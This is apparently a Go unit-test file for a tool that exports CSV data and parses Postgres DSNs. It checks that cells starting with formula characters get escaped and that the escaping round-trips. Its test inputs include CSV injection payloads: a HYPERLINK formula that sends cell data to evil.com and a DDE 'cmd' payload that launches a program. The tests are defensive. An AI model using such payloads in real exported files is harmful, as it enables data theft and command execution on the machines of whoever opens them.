package main

import "testing"

// TestEscapeCSVFormula 防回归：导出 CSV 的字段来自 git 提交者名等外部可控来源，
// 以 = + - @ 或制表符/回车开头会被 Excel/LibreOffice 当公式执行。
func TestEscapeCSVFormula(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"HYPERLINK 外带数据", `=HYPERLINK("http://evil.com?d="&A1,"x")`, `'=HYPERLINK("http://evil.com?d="&A1,"x")`},
		{"cmd 调起外部程序", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
		{"加号开头", "+1234", "'+1234"},
		{"减号开头", "-1+2", "'-1+2"},
		{"@ 开头", "@SUM(A1)", "'@SUM(A1)"},
		{"制表符开头", "\ttab", "'\ttab"},
		{"回车开头", "\rcr", "'\rcr"},
		{"中文名不误伤", "张三", "张三"},
		{"邮箱不误伤", "zhangsan@sangfor.com", "zhangsan@sangfor.com"},
		{"普通名不误伤", "normal-name", "normal-name"},
		{"空串", "", ""},
		// 数据本身以单引号开头：也加一层，否则回读侧无法与转义前缀区分
		{"单引号+公式字符", "'=foo", "''=foo"},
		{"单引号+普通字符", "'99", "''99"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := escapeCSVFormula(tt.in); got != tt.want {
				t.Errorf("escapeCSVFormula(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestCSVEscapeRoundTrip 防回归：导出加的转义前缀必须能被回读路径精确剥离。
// import-org 支持 --from-csv / org_csv_file 把导出的 CSV 再读回来写库，
// 若只加不减，往返一次就会把 '=xxx 当成真实数据写进 user_org 表。
func TestCSVEscapeRoundTrip(t *testing.T) {
	originals := []string{
		`=HYPERLINK("http://evil.com",A1)`,
		"+86-13800000000",
		"-lead-dash",
		"@mention",
		"\ttabbed",
		"张三",
		"zhangsan@sangfor.com",
		"",
		"normal-name", // 含连字符但不在首位
		// 以下为 codex review 指出的原测试盲区：数据自带前导单引号
		"'99",    // 单引号 + 普通字符
		"'=foo",  // 单引号 + 公式字符：曾被误剥成 =foo
		"'@bar",  // 同上
		"''both", // 连续两个单引号
	}
	for _, orig := range originals {
		got := unescapeCSVFormula(escapeCSVFormula(orig))
		if got != orig {
			t.Errorf("往返不幂等: %q -> escape %q -> unescape %q",
				orig, escapeCSVFormula(orig), got)
		}
	}
}

func TestEscapeCSVRow(t *testing.T) {
	in := []string{"u1", "=1+1", "张三", "@evil"}
	want := []string{"u1", "'=1+1", "张三", "'@evil"}
	got := escapeCSVRow(in)
	if len(got) != len(want) {
		t.Fatalf("长度不符: got %d want %d", len(got), len(want))
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("字段[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestReplaceDBName(t *testing.T) {
	tests := []struct {
		name      string
		dsn       string
		newDBName string
		want      string
	}{
		{
			name:      "DSN with dbname replaces existing value",
			dsn:       "host=localhost port=5432 user=postgres password=secret dbname=old_db sslmode=disable",
			newDBName: "new_db",
			want:      "host=localhost port=5432 user=postgres password=secret dbname=new_db sslmode=disable",
		},
		{
			name:      "DSN without dbname appends dbname",
			dsn:       "host=localhost port=5432 user=postgres password=secret sslmode=disable",
			newDBName: "report",
			want:      "host=localhost port=5432 user=postgres password=secret sslmode=disable dbname=report",
		},
		{
			name:      "DSN with multiple spaces handles correctly",
			dsn:       "host=localhost  port=5432  user=postgres  dbname=old_db  sslmode=disable",
			newDBName: "new_db",
			want:      "host=localhost  port=5432  user=postgres  dbname=new_db  sslmode=disable",
		},
		{
			name:      "empty DSN appends dbname",
			dsn:       "",
			newDBName: "report",
			want:      " dbname=report",
		},
		{
			name:      "same dbname replacement no effective change",
			dsn:       "host=localhost dbname=same_db port=5432",
			newDBName: "same_db",
			want:      "host=localhost dbname=same_db port=5432",
		},
		{
			name:      "dbname in middle of string replaces correctly",
			dsn:       "host=localhost dbname=middle_db user=postgres port=5432",
			newDBName: "replaced_db",
			want:      "host=localhost dbname=replaced_db user=postgres port=5432",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := replaceDBName(tt.dsn, tt.newDBName)
			if got != tt.want {
				t.Errorf("replaceDBName(%q, %q) = %q, want %q", tt.dsn, tt.newDBName, got, tt.want)
			}
		})
	}
}

func TestExtractDBName(t *testing.T) {
	tests := []struct {
		name string
		dsn  string
		want string
	}{
		{
			name: "DSN with dbname=foo returns foo",
			dsn:  "host=localhost port=5432 dbname=foo user=postgres",
			want: "foo",
		},
		{
			name: "DSN without dbname returns empty",
			dsn:  "host=localhost port=5432 user=postgres",
			want: "",
		},
		{
			name: "dbname=foo with extra spaces after returns foo",
			dsn:  "host=localhost dbname=foo   user=postgres",
			want: "foo",
		},
		{
			name: "dbname at end returns value",
			dsn:  "host=localhost port=5432 user=postgres dbname=end_db",
			want: "end_db",
		},
		{
			name: "empty string returns empty",
			dsn:  "",
			want: "",
		},
		{
			name: "multiple spaces between parts handles correctly",
			dsn:  "host=localhost  port=5432  dbname=spaced_db  user=postgres",
			want: "spaced_db",
		},
		{
			name: "dbname= with empty value returns empty",
			dsn:  "host=localhost port=5432 dbname= user=postgres",
			want: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractDBName(tt.dsn)
			if got != tt.want {
				t.Errorf("extractDBName(%q) = %q, want %q", tt.dsn, got, tt.want)
			}
		})
	}
}
